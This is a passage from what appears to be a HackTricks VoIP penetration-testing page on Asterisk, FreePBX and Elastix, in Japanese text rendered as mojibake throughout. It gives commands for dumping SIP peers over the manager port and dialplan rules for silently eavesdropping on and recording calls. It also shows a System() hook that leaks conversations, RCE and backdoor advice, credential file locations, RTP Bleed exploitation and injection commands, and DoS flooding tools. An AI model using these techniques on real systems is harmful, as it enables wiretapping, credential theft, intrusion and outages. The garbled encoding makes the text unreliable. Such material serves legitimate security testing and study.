read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* å‰ã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã¯ **ä»»æ„ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ¥ç¶šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã¾ã™**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€‚
* å‰è¿°ã®ã‚ˆã†ã« **é€šè©±ã‚’çµ„ç¹”ã™ã‚‹ãŸã‚ã«ã¯**ã€**èª­ã¿å–ã‚Šæ¨©é™ã¯å¿…è¦ãªã**ã€**æ›¸ãè¾¼ã¿**ã® **ç™ºä¿¡**ã®ã¿ãŒå¿…è¦ã§ã™ã€‚

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã£ã¦ã„ã‚‹ä»»æ„ã®IPãŒæ¥ç¶šã—ã€éå‰°ãªæƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**ã•ã‚‰ãªã‚‹æƒ…å ±ã‚„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒè¦æ±‚ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚**

### **ç›—è´**

Asteriskã§ã¯ã€**`ChanSpy`** ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€**ç›£è¦–ã™ã‚‹å†…ç·š**ï¼ˆã¾ãŸã¯ã™ã¹ã¦ã®å†…ç·šï¼‰ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€è¡Œã‚ã‚Œã¦ã„ã‚‹ä¼šè©±ã‚’èãã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯å†…ç·šã«å‰²ã‚Šå½“ã¦ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä¾‹ãˆã°ã€**`exten => 333,1,ChanSpy('all',qb)`** ã¯ã€**å†…ç·š 333** ã«**é›»è©±**ã‚’ã‹ã‘ã‚‹ã¨ã€**`all`** ã®å†…ç·šã‚’**ç›£è¦–**ã—ã€æ–°ã—ã„ä¼šè©±ãŒå§‹ã¾ã‚‹ã¨ãã«**èãå§‹ã‚**ï¼ˆ**`b`**ï¼‰ã€é™ã‹ãªãƒ¢ãƒ¼ãƒ‰ï¼ˆ**`q`**ï¼‰ã§è¡Œã„ã¾ã™ã€‚ç§ãŸã¡ã¯ãã‚Œã«å¯¾ã—ã¦ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒˆã—ãŸããªã„ã‹ã‚‰ã§ã™ã€‚**`*`** ã‚’æŠ¼ã™ã‹ã€å†…ç·šç•ªå·ã‚’å…¥åŠ›ã™ã‚‹ã“ã¨ã§ã€è¡Œã‚ã‚Œã¦ã„ã‚‹ä¼šè©±ã‹ã‚‰åˆ¥ã®ä¼šè©±ã«ç§»å‹•ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ç‰¹å®šã®å†…ç·šã®ã¿ã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã«ã€**`ExtenSpy`** ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ä¼šè©±ã‚’èãä»£ã‚ã‚Šã«ã€å†…ç·šã‚’ä½¿ç”¨ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã«éŒ²éŸ³ã™ã‚‹**ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè©±ã¯ **`/tmp`** ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

Asterisk ã« **é€šè©±ã‚’æ¼æ´©ã•ã›ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã•ã›ã‚‹** ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed è„†å¼±æ€§

**RTCPBleed** ã¯ã€Asterisk ãƒ™ãƒ¼ã‚¹ã® VoIP ã‚µãƒ¼ãƒãƒ¼ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã§ã™ï¼ˆ2017å¹´ã«å…¬é–‹ï¼‰ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€VoIP é€šè©±ã‚’é‹ã¶ **RTP (ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒ—ãƒ­ãƒˆã‚³ãƒ«) ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯** ãŒ **ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®èª°ã§ã‚‚å‚å—ã•ã‚Œã€ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹** å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒ NAT (ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ‰ãƒ¬ã‚¹å¤‰æ›) ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’é€šéã™ã‚‹éš›ã«èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ç™ºç”Ÿã—ã¾ã™ã€‚

RTP ãƒ—ãƒ­ã‚­ã‚·ã¯ã€2 ã¤ä»¥ä¸Šã®å½“äº‹è€…é–“ã§ RTP ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒ—ãƒ­ã‚­ã‚·ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ RTC ã‚·ã‚¹ãƒ†ãƒ ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ **NAT ã®åˆ¶é™** ã«å¯¾å‡¦ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚NAT ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€RTP ãƒ—ãƒ­ã‚­ã‚·ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯ã€ã—ã°ã—ã°ã‚·ã‚°ãƒŠãƒªãƒ³ã‚°ï¼ˆä¾‹ï¼šSIPï¼‰ã‚’é€šã˜ã¦å–å¾—ã•ã‚ŒãŸ RTP IP ãŠã‚ˆã³ãƒãƒ¼ãƒˆæƒ…å ±ã«ä¾å­˜ã§ãã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ã„ãã¤ã‹ã® RTP ãƒ—ãƒ­ã‚­ã‚·ã¯ã€ãã®ã‚ˆã†ãª **IP ãŠã‚ˆã³ãƒãƒ¼ãƒˆã®ã‚¿ãƒ—ãƒ«ã‚’è‡ªå‹•çš„ã«å­¦ç¿’ã™ã‚‹** ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€å—ä¿¡ã—ãŸ RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’æ¤œæŸ»ã—ã€å—ä¿¡ã—ãŸ RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚½ãƒ¼ã‚¹ IP ãŠã‚ˆã³ãƒãƒ¼ãƒˆã‚’å¿œç­”ã™ã¹ãã‚‚ã®ã¨ã—ã¦ãƒãƒ¼ã‚¯ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚ã“ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯ã€Œå­¦ç¿’ãƒ¢ãƒ¼ãƒ‰ã€ã¨å‘¼ã°ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€**ã„ã‹ãªã‚‹ç¨®é¡ã®èªè¨¼ã‚‚ä½¿ç”¨ã—ã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€**æ”»æ’ƒè€…** ã¯ **RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ RTP ãƒ—ãƒ­ã‚­ã‚·ã«é€ä¿¡ã—ã€é€²è¡Œä¸­ã® RTP ã‚¹ãƒˆãƒªãƒ¼ãƒ ã®ç™ºä¿¡è€…ã¾ãŸã¯å—ä¿¡è€…å‘ã‘ã«æ„å›³ã•ã‚ŒãŸãƒ—ãƒ­ã‚­ã‚·ã•ã‚ŒãŸ RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’å—ã‘å–ã‚‹** ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã‚’ RTP Bleed ã¨å‘¼ã¶ã®ã¯ã€æ”»æ’ƒè€…ãŒæ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é€ä¿¡ã•ã‚Œã‚‹ã¯ãšã® RTP ãƒ¡ãƒ‡ã‚£ã‚¢ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’å—ä¿¡ã§ãã‚‹ãŸã‚ã§ã™ã€‚

RTP ãƒ—ãƒ­ã‚­ã‚·ãŠã‚ˆã³ RTP ã‚¹ã‚¿ãƒƒã‚¯ã®ã‚‚ã†ä¸€ã¤ã®èˆˆå‘³æ·±ã„æŒ™å‹•ã¯ã€æ™‚ã«ã¯ **RTP Bleed ã«å¯¾ã—ã¦è„†å¼±ã§ãªãã¦ã‚‚**ã€**ä»»æ„ã®ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã® RTP ãƒ‘ã‚±ãƒƒãƒˆã‚’å—ã‘å…¥ã‚Œã€è»¢é€ã—ã€ã¾ãŸã¯å‡¦ç†ã™ã‚‹** ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯æ­£å½“ãªãƒ¡ãƒ‡ã‚£ã‚¢ã®ä»£ã‚ã‚Šã«è‡ªåˆ†ã®ãƒ¡ãƒ‡ã‚£ã‚¢ã‚’æ³¨å…¥ã§ãã‚‹ RTP ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã‚’ RTP æ³¨å…¥ã¨å‘¼ã¶ã®ã¯ã€æ—¢å­˜ã® RTP ã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ä¸æ­£ãª RTP ãƒ‘ã‚±ãƒƒãƒˆã‚’æ³¨å…¥ã§ãã‚‹ãŸã‚ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€RTP ãƒ—ãƒ­ã‚­ã‚·ã¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸¡æ–¹ã«å­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Asterisk ã¨ FreePBX ã¯ã€ä¼çµ±çš„ã« **`NAT=yes` è¨­å®š** ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã“ã‚Œã«ã‚ˆã‚Š RTP ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒèªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€é€šè©±ã§éŸ³å£°ãŒãªã„ã‹ä¸€æ–¹å‘ã®éŸ³å£°ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ [https://www.rtpbleed.com/](https://www.rtpbleed.com/) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed ã¯ã€RTP ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ RTP Bleed è„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¾ã™ã€‚
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleedã¯ã€RTCPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§RTP Bleedè„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¾ã™ã€‚
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedfloodã¯ã€RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§RTP Bleedè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinjectã¯ã€éŸ³å£°ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆWAVå½¢å¼ï¼‰ã‚’æ³¨å…¥ã—ã¦RTP Bleedè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskã§ã¯ã€**æ‹¡å¼µãƒ«ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦å†èª­ã¿è¾¼ã¿ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹æ–¹æ³•ãŒã‚ã‚Šï¼ˆä¾‹ãˆã°ã€è„†å¼±ãªã‚¦ã‚§ãƒ–ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ï¼‰ã€**`System`**ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
ã‚‚ã—ã‚µãƒ¼ãƒãƒ¼ãŒ**`System`**ã‚³ãƒãƒ³ãƒ‰ã§**ç‰¹å®šã®æ–‡å­—ã®ä½¿ç”¨ã‚’ç¦æ­¢ã—ã¦ã„ã‚‹**å ´åˆï¼ˆElastixã®ã‚ˆã†ã«ï¼‰ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒ**ã‚·ã‚¹ãƒ†ãƒ å†…ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹ã‹**ç¢ºèªã—ã¦ãã ã•ã„ï¼ˆElastixã‚„trixboxã®ã‚ˆã†ã«ï¼‰ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦**ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆ**ã—ã€ãã®å¾Œ**`System`**ã‚’ä½¿ç”¨ã—ã¦ãã®**ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œ**ã—ã¾ã™ã€‚
{% endhint %}

#### èˆˆå‘³æ·±ã„ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã¨æ¨©é™

* **`sip.conf`** -> SIPãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ã€‚
* **Asteriskã‚µãƒ¼ãƒãƒ¼ãŒrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€rootã‚’å±é™ºã«ã•ã‚‰ã™ã“ã¨ãŒã§ãã‚‹ã€‚
* **mysql rootãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹**ã€‚
* ã“ã‚Œã¯ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã€‚
* **`FreePBX`**
* **`amportal.conf`** -> ã‚¦ã‚§ãƒ–ãƒ‘ãƒãƒ«ç®¡ç†è€…ï¼ˆFreePBXï¼‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ã€‚
* **`FreePBX.conf`** -> ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹FreePBXuserã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ã€‚
* ã“ã‚Œã¯ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã€‚
* **`Elastix`**
* **`Elastix.conf`** -> mysql rootãƒ‘ã‚¹ã€IMAPdãƒ‘ã‚¹ã€ã‚¦ã‚§ãƒ–ç®¡ç†è€…ãƒ‘ã‚¹ãªã©ã®ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ã€‚
* **ã„ãã¤ã‹ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼**ã¯ã€ä¾µå®³ã•ã‚ŒãŸasteriskãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å±ã—ã¾ã™ï¼ˆrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ãªã„å ´åˆï¼‰ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å‰è¿°ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã€è¨­å®šã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã‚‹ãŸã‚ã€AsteriskãŒå®Ÿè¡Œæ™‚ã«ä»–ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ãƒã‚¤ãƒŠãƒªã‚’èª­ã¿è¾¼ã‚€ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### RTPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

**`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰ã‚„**`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã«**`.wav`**ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã¾ãŸã€[http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ã‹ã‚‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€**ä¼šè©±ã‚’ã‚¹ã‚­ãƒ£ãƒ³**ã™ã‚‹ï¼ˆ**`rtpscan.pl`**ï¼‰ã€ä¼šè©±ã«**`.wav`**ã‚’é€ä¿¡ã™ã‚‹ï¼ˆ**`rtpsend.pl`**ï¼‰ã€ä¼šè©±ã«**ãƒã‚¤ã‚ºã‚’æŒ¿å…¥**ã™ã‚‹ï¼ˆ**`rtpflood.pl`**ï¼‰ã“ã¨ãŒã§ãã¾ã™ã€‚

### DoS

VoIPã‚µãƒ¼ãƒãƒ¼ã§DoSã‚’é”æˆã™ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

* **`SIPPTS flood`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS floodã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ç„¡é™ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ã€‚
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS pingã¯ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”æ™‚é–“ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«SIP pingã‚’è¡Œã„ã¾ã™ã€‚
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asteriskã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹DoS IAXãƒ—ãƒ­ãƒˆã‚³ãƒ«ã€‚
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IPä¸Šã§SIP/SDP INVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®æ´ªæ°´ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã€‚
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): ã„ãã¤ã‹ã®é©åˆ‡ã«å½¢æˆã•ã‚ŒãŸRTPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹RTPãƒãƒ¼ãƒˆã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆæœ€åˆã«ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã—ã¦ãã ã•ã„ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp): SIPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†æãŠã‚ˆã³ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€DoSã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIPã‚¹ã‚¤ã‚¹ã‚¢ãƒ¼ãƒŸãƒ¼ãƒŠã‚¤ãƒ•ã€‚SIPæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/)ã€[**voiper**](https://github.com/gremwell/voiper)ã€‚

### OSã®è„†å¼±æ€§

Asteriskã®ã‚ˆã†ãªã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã¯ã€ã™ã§ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹**OSãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚ä¾‹ï¼š**FreePBXã€Elastixã€Trixbox**... ãã‚Œã‚‰ã®å•é¡Œã¯ã€ä¸€åº¦å‹•ä½œã—å§‹ã‚ã‚‹ã¨ã€ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ãŒ**å†åº¦æ›´æ–°ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Š**ã€**è„†å¼±æ€§**ãŒæ™‚é–“ã¨ã¨ã‚‚ã«ç™ºè¦‹ã•ã‚Œã‚‹ã“ã¨ã§ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
